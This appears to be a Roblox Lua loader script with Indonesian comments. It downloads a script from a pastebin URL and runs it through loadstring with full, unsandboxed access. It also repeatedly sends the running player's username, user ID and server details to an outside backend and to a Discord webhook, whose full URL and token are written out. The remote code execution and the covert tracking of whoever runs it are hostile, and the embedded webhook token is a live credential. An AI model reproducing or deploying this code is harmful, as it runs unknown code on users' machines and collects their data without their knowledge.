local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Configuration
local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
local RETRY_LIMIT = 3
local RETRY_DELAY = 2
local DEBOUNCE_TIME = 30

local player = Players.LocalPlayer
local lastSendTime = 0
local externalScriptCache = nil

-- Fungsi untuk mengambil script eksternal
local function fetchExternalScript()
    if externalScriptCache then
        return externalScriptCache
    end
    
    for i = 1, RETRY_LIMIT do
        local success, response = pcall(function()
            return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
        end)
        
        if success then
            externalScriptCache = response
            return response
        end
        
        if i < RETRY_LIMIT then
            task.wait(RETRY_DELAY)
        end
    end
    
    error("Failed to fetch external script after "..RETRY_LIMIT.." attempts")
end

-- Eksekusi script langsung tanpa sandbox
local function executeExternalScript()
    local scriptContent = fetchExternalScript()
    local fn, err = loadstring(scriptContent)
    
    if not fn then
        error("Load failed: "..tostring(err))
    end
    
    -- Jalankan dengan environment normal (full access)
    return fn()
end

-- Sistem pengiriman data ke backend (TIDAK DIHAPUS)
local function sendToBackend(data)
    for i = 1, RETRY_LIMIT do
        local success = pcall(function()
            HttpService:RequestAsync({
                Url = BACKEND_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["X-Game-ID"] = tostring(game.GameId)
                },
                Body = HttpService:JSONEncode(data)
            })
        end)
        if success then break end
        if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
    end
end

-- Sistem pengiriman ke webhook (TIDAK DIHAPUS)
local function sendToWebhook(data)
    local embed = {
        {
            title = "Player Activity Log",
            description = string.format(
                "**%s**\nUserID: %d\nGame: [%d](https://www.roblox.com/games/%d)",
                data.username, data.userId, data.placeId, data.placeId
            ),
            color = 16711680,
            fields = {
                {
                    name = "Instance ID",
                    value = data.instanceId,
                    inline = true
                },
                {
                    name = "Timestamp",
                    value = os.date("%Y-%m-%d %H:%M:%S", data.timestamp),
                    inline = true
                }
            }
        }
    }

    for i = 1, RETRY_LIMIT do
        local success = pcall(function()
            HttpService:RequestAsync({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = embed})
            })
        end)
        if success then break end
        if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
    end
end

-- Logger system (TIDAK DIHAPUS)
local function sendLoggerData()
    if os.time() - lastSendTime < DEBOUNCE_TIME then
        return
    end

    local data = {
        username = player.Name,
        userId = player.UserId,
        instanceId = game.JobId,
        timestamp = os.time(),
        placeId = game.PlaceId,
        gameId = game.GameId
    }

    lastSendTime = os.time()

    -- Kirim ke backend
    task.spawn(function()
        sendToBackend(data)
    end)

    -- Kirim ke webhook
    task.spawn(function()
        sendToWebhook(data)
    end)
end

-- Main system
local function init()
    -- Jalankan script eksternal
    local success, err = pcall(executeExternalScript)
    if not success then
        warn("External script error: ", err)
        sendToWebhook({
            content = string.format("Script error: %s", tostring(err))
        })
    end

    -- Aktifkan logger
    player.CharacterAdded:Connect(sendLoggerData)
    if player.Character then
        sendLoggerData()
    end
    
    -- Periodic logging
    while true do
        task.wait(300)
        sendLoggerData()
    end
end

-- Start
pcall(init)
